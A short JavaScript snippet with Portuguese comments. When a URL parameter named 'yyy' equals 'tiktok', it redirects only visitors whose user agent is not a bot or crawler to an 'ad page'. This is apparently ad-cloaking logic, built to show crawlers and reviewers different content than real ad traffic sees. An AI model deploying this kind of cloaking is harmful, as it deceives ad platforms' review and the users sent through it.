   // Função para obter parâmetros da URL
        function getParameterByName(name, url = window.location.href) {
            name = name.replace(/[\[\]]/g, '\\$&');
            var regex = new RegExp('[?&]' + name + '(=([^&#]*)|&|#|$)'),
                results = regex.exec(url);
            if (!results) return null;
            if (!results[2]) return '';
            return decodeURIComponent(results[2].replace(/\+/g, ' '));
        }

        // Obter o valor do parâmetro "yyy"
        var placementValue = getParameterByName('yyy');

        // Verificar se o valor é "TikTok" ou "Tiktok" (case-insensitive)
        if (placementValue && placementValue.toLowerCase() === 'tiktok') {
            // Verificar se é um navegador real (não bot)
            var isBot = /bot|googlebot|crawler|spider|robot|crawling/i.test(navigator.userAgent);

            // Redirecionar apenas usuários reais
            if (!isBot) {
                window.location.href = 'https://www.google.com'; // Página do anúncio
            }
        }
